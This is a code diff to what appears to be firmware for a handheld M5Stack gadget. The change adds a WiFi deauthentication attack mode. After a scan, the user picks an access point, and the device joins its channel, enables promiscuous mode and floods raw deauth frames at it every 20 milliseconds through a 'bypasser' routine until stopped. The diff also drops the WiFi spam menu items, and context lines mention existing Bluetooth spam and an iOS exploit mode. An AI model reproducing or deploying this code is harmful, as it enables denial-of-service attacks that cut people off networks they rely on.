@@ -10,6 +10,7 @@
 #if defined(CARDPUTER_ADV)
   #define CARDPUTER
 #endif
+#define DEAUTHER
 // -=-=- Uncommenting more than one at a time will result in errors -=-=-
 
 String buildver="2.0.5";
@@ -122,6 +123,7 @@ String buildver="2.0.5";
 #include "applejuice.h"
 #include "WORLD_IR_CODES.h"
 #include "wifispam.h"
+#include "deauth.h"
 #include <BLEUtils.h>
 #include <BLEServer.h>
 #include <esp_wifi.h>
@@ -135,6 +137,11 @@ bool rstOverride = false; // Reset Button Override. Set to true when navigating 
 bool sourApple = false;   // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
 bool swiftPair = false;   // Internal flag to place AppleJuice into Swift Pair random packet Mode
 bool maelstrom = false;   // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
+
+int deauthTargetIndex = 0;
+bool deauthRunning = false;
+wifi_ap_record_t deauthTargetAp;
+uint8_t deauthTargetChan = 1;
 #if defined(USE_EEPROM)
   #include <EEPROM.h>
   #define EEPROM_SIZE 4
@@ -166,6 +173,7 @@ struct MENU {
 // 16 - Bluetooth Spam Menu
 // 17 - Bluetooth Maelstrom
 // 18 - QR Codes
+// 19 - Wifi Deauth Target
 
 struct QRCODE {
   char name[19];
@@ -206,6 +214,7 @@ void check_menu_press() {
 #if defined(M5_BUTTON_MENU)
   if (digitalRead(M5_BUTTON_MENU) == LOW){
 #endif
+    deauthRunning = false;
     isSwitching = true;
     rstOverride = false;
     current_proc = 1;
@@ -1357,9 +1366,6 @@ void btmaelstrom_loop(){
 MENU wsmenu[] = {
   { "Back", 4},
   { "Scan Wifi", 0},
-  { "Spam Funny", 1},
-  { "Spam Rickroll", 2},
-  { "Spam Random", 3},
 };
 
 void wsmenu_drawmenu() {
@@ -1389,22 +1395,10 @@ void wsmenu_loop() {
   if (check_select_press()) {
     int option = wsmenu[cursor].command;
     rstOverride = false;
-    current_proc = 11;
     isSwitching = true;
     switch(option) {
       case 0:
-        rstOverride = false;
-        isSwitching = true;
         current_proc = 14;
-        break;
-      case 1:
-        spamtype = 1;
-        break;
-      case 2:
-        spamtype = 2;
-        break;
-      case 3:
-        spamtype = 3;
         break;
       case 4:
         current_proc = 1;
@@ -1414,7 +1408,6 @@ void wsmenu_loop() {
 }
 
 void wscan_drawmenu() {
-  char ssid[19];
   DISP.setTextSize(SMALL_TEXT);
   DISP.fillScreen(BGCOLOR);
   DISP.setCursor(0, 5, 1);
@@ -1438,6 +1431,7 @@ void wscan_drawmenu() {
 
 void wscan_result_setup() {
   cursor = 0;
+  deauthRunning = false;
   rstOverride = true;
   wscan_drawmenu();
   delay(500); // Prevent switching after menu loads up
@@ -1454,53 +1448,29 @@ void wscan_result_loop(){
     delay(250);
     if(cursor == wifict){
       rstOverride = false;
+      isSwitching = true;
       current_proc = 14;
+      return;
     }
     if(cursor == wifict + 1){
       rstOverride = false;
       isSwitching = true;
       current_proc = 12;
+      return;
     }
-    String encryptType = "";
-    switch (WiFi.encryptionType(cursor)) {
-    case 1:
-      encryptType = "WEP";
-      break;
-    case 2:
-      encryptType = "WPA/PSK/TKIP";
-      break;
-    case 3:
-      encryptType = "WPA/PSK/CCMP";
-      break;
-    case 4:
-      encryptType = "WPA2/PSK/Mixed/CCMP";
-      break;
-    case 8:
-      encryptType = "WPA/WPA2/PSK";
-      break ;
-    case 0:
-      encryptType = "Open";
-      break ;
+    if(cursor < wifict){
+      deauthTargetIndex = cursor;
+      rstOverride = false;
+      isSwitching = true;
+      current_proc = 19;
     }
-    
-    DISP.setTextSize(MEDIUM_TEXT);
-    if(WiFi.SSID(cursor).length() > 12){
-      DISP.setTextSize(SMALL_TEXT);
-    }       
-    DISP.fillScreen(BGCOLOR);
-    DISP.setCursor(5, 1);
-    DISP.println(WiFi.SSID(cursor));
-    DISP.setTextSize(SMALL_TEXT);
-    DISP.printf("Chan : %d\n", WiFi.channel(cursor));
-    DISP.printf("Crypt: %s\n", encryptType);
-    DISP.print("BSSID:\n" + WiFi.BSSIDstr(i));
-    DISP.printf("\nNext: Back\n");
   }
 }
 
 void wscan_setup(){
   rstOverride = false;  
   cursor = 0;
+  deauthRunning = false;
   DISP.fillScreen(BGCOLOR);
   DISP.setTextSize(BIG_TEXT);
   DISP.setCursor(5, 1);
@@ -1522,6 +1492,58 @@ void wscan_loop(){
     current_proc=15;
   }
 }
+
+#if defined(DEAUTHER)
+void deauth_setup() {
+  rstOverride = true;
+  deauthRunning = true;
+  deauthTargetChan = (uint8_t)WiFi.channel(deauthTargetIndex);
+  memset(&deauthTargetAp, 0, sizeof(deauthTargetAp));
+  memcpy(deauthTargetAp.bssid, WiFi.BSSID(deauthTargetIndex), 6);
+  strlcpy((char*)deauthTargetAp.ssid, WiFi.SSID(deauthTargetIndex).c_str(), sizeof(deauthTargetAp.ssid));
+  deauthTargetAp.primary = deauthTargetChan;
+
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAP("Nemo_AP", nullptr, deauthTargetChan, true, 1);
+  delay(50);
+  esp_wifi_set_promiscuous(true);
+
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+  wsl_bypasser_send_deauth_frame(&deauthTargetAp, deauthTargetChan);
+
+  DISP.fillScreen(BGCOLOR);
+  DISP.setTextSize(MEDIUM_TEXT);
+  DISP.setCursor(5, 1);
+  DISP.println("Deauth");
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.println(WiFi.SSID(deauthTargetIndex).substring(0, 19));
+  DISP.printf("Ch: %d\n", deauthTargetChan);
+  DISP.println("Next/Sel: Stop");
+  delay(250);
+}
+
+void deauth_loop() {
+  if (!deauthRunning) {
+    rstOverride = false;
+    isSwitching = true;
+    current_proc = 15;
+    return;
+  }
+
+  if (check_next_press() || check_select_press()) {
+    deauthRunning = false;
+    esp_wifi_set_promiscuous(false);
+    rstOverride = false;
+    isSwitching = true;
+    current_proc = 15;
+    delay(250);
+    return;
+  }
+
+  wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
+  delay(20);
+}
+#endif
 
 void bootScreen(){
   // Boot Screen
@@ -1733,6 +1755,11 @@ void loop() {
       case 18:
         qrmenu_setup();
         break;
+#if defined(DEAUTHER)
+      case 19:
+        deauth_setup();
+        break;
+#endif
 
     }
   }
@@ -1801,5 +1828,10 @@ void loop() {
     case 18:
       qrmenu_loop();
       break;
+#if defined(DEAUTHER)
+    case 19:
+      deauth_loop();
+      break;
+#endif
   }
 }
